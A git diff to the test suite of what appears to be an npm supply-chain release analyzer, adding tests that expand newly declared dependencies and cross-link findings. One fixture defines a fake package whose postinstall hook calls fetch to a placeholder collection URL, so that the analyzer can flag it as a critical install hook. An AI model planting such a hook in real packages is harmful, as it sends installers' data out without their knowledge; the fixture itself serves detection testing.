@@ -12,6 +12,7 @@ import type {
   LockfileDiffResult,
 } from "../core/contract/lockfile-diff.js";
 import { REPORT_SCHEMA_VERSION } from "../core/report-contract.js";
+import type { JsonReport, JsonRunReport } from "../core/report-contract.js";
 import {
   analyzeArtifact,
   analyzeRelease,
@@ -20,8 +21,10 @@ import {
 } from "./analyze-release.js";
 import { ANALYZER_VERSION } from "./analyzer-version.js";
 import { JsonStore } from "./json-store.js";
+import { candidatesForPackage } from "./registry-collector.js";
 import type { ReleaseCandidate } from "./release-candidate.js";
 import { ReleaseStore } from "./release-store.js";
+import { createFakeRegistry, REGISTRY_ORIGIN } from "./test-registry.js";
 
 const CANDIDATE: ReleaseCandidate = {
   ecosystem: "npm",
@@ -55,6 +58,15 @@ function only(diff: LockfileDiffResult): ChangedPackage {
     throw new Error("fake analyze received no changed package");
   }
   return changed;
+}
+
+function reportFor(run: JsonRunReport, name: string): JsonReport {
+  for (const item of run.packages) {
+    if (item.status === "analyzed" && item.report.package.name === name) {
+      return item.report;
+    }
+  }
+  throw new Error(`no analyzed report for ${name}`);
 }
 
 function analyzedRun(
@@ -209,12 +221,12 @@ describe("analyzeRelease", () => {
     const second = await analyzeRelease(CANDIDATE, {
       store,
       analyze,
-      analyzerVersion: "capdelta-engine-2",
+      analyzerVersion: "capdelta-engine-3",
     });
 
     expect(first.created).toBe(true);
     expect(second.created).toBe(true);
-    expect(second.record.analyzerVersion).toBe("capdelta-engine-2");
+    expect(second.record.analyzerVersion).toBe("capdelta-engine-3");
     expect(calls).toHaveLength(2);
     await expect(store.listKeys()).resolves.toHaveLength(2);
     await expect(store.findByVersion("alpha", "2.0.0")).resolves.toHaveLength(
@@ -316,5 +328,121 @@ describe("analyzeArtifact", () => {
     expect(record.previousDigest).toBeNull();
     expect(CANDIDATE.previous).not.toBeNull();
     await expect(store.findByDigest("sha512-new")).resolves.toHaveLength(1);
+  });
+});
+
+describe("release dependency children", () => {
+  function collectorFor(registry: ReturnType<typeof createFakeRegistry>): {
+    fetchImpl: typeof fetch;
+    registryUrl: string;
+  } {
+    return { fetchImpl: registry.fetchImpl, registryUrl: REGISTRY_ORIGIN };
+  }
+
+  async function latestCandidate(
+    registry: ReturnType<typeof createFakeRegistry>,
+    name: string,
+    version: string,
+  ): Promise<ReleaseCandidate> {
+    const { candidates } = await candidatesForPackage(
+      name,
+      collectorFor(registry),
+    );
+    const candidate = candidates.find((item) => item.version === version);
+    if (candidate === undefined) {
+      throw new Error(`no candidate for ${name}@${version}`);
+    }
+    return candidate;
+  }
+
+  it("analyzes a newly declared child and cross-links the parent dependency finding", async () => {
+    const registry = createFakeRegistry();
+    registry.publish("wallpaper", "10.0.0");
+    registry.publish("wallpaper", "11.0.0", {
+      dependencies: { peacenotwar: "^9.0.0" },
+    });
+    registry.publish("peacenotwar", "9.1.1", {
+      scripts: { postinstall: "node index.js" },
+      indexJs: 'fetch("https://example.invalid/collect");\n',
+    });
+    const candidate = await latestCandidate(registry, "wallpaper", "11.0.0");
+    expect(candidate.children?.map((child) => child.name)).toEqual([
+      "peacenotwar",
+    ]);
+
+    const { record } = await analyzeRelease(candidate, {
+      store,
+      analyzeOptions: {
+        fetcher: {
+          fetchImpl: registry.fetchImpl,
+          sleep: () => Promise.resolve(),
+        },
+      },
+    });
+
+    expect(record.status).toBe("complete");
+    expect(record.report.packages).toHaveLength(2);
+    const child = reportFor(record.report, "peacenotwar");
+    const installHook = child.findings.find(
+      (finding) => finding.capability.kind === "INSTALL_HOOK",
+    );
+    expect(installHook).toMatchObject({
+      severity: "CRITICAL",
+      change: "added",
+      capability: { kind: "INSTALL_HOOK", hook: "postinstall" },
+    });
+
+    const parent = reportFor(record.report, "wallpaper");
+    const dependency = parent.findings.find(
+      (finding) => finding.capability.kind === "DEPENDENCY",
+    );
+    expect(dependency).toMatchObject({
+      severity: "LOW",
+      change: "added",
+      capability: { kind: "DEPENDENCY", name: "peacenotwar" },
+    });
+    expect(dependency?.relatedReportIds).toEqual([child.reportId]);
+  });
+
+  it("does not expand a dependency whose range only changed", async () => {
+    const registry = createFakeRegistry();
+    registry.publish("vetted", "1.0.0", {
+      dependencies: { esbuild: "^0.20.0" },
+    });
+    registry.publish("vetted", "1.1.0", {
+      dependencies: { esbuild: "^0.21.0" },
+    });
+    registry.publish("esbuild", "0.21.0");
+    const candidate = await latestCandidate(registry, "vetted", "1.1.0");
+
+    expect(candidate.children ?? []).toEqual([]);
+    expect(candidate.unresolvedChildren ?? []).toEqual([]);
+    expect(registry.requestCount(`${REGISTRY_ORIGIN}/esbuild`)).toBe(0);
+
+    const { analyze, calls } = fakeAnalyze(analyzedRun);
+    await analyzeRelease(candidate, { store, analyze });
+    expect(calls[0]?.changed).toHaveLength(1);
+  });
+
+  it("marks the record incomplete and names an unresolvable child", async () => {
+    const { analyze, calls } = fakeAnalyze(analyzedRun);
+    const candidate: ReleaseCandidate = {
+      ...CANDIDATE,
+      children: [],
+      unresolvedChildren: [
+        {
+          name: "ghost-child",
+          reason: 'no published version matches "^1.0.0"',
+        },
+      ],
+    };
+
+    const { record } = await analyzeRelease(candidate, { store, analyze });
+
+    expect(calls[0]?.changed).toHaveLength(1);
+    expect(record.status).toBe("incomplete");
+    expect(record.incompleteReasons).toHaveLength(1);
+    expect(record.incompleteReasons[0]).toContain("ghost-child");
+    expect(record.incompleteReasons[0]).toContain("no published version");
   });
 });
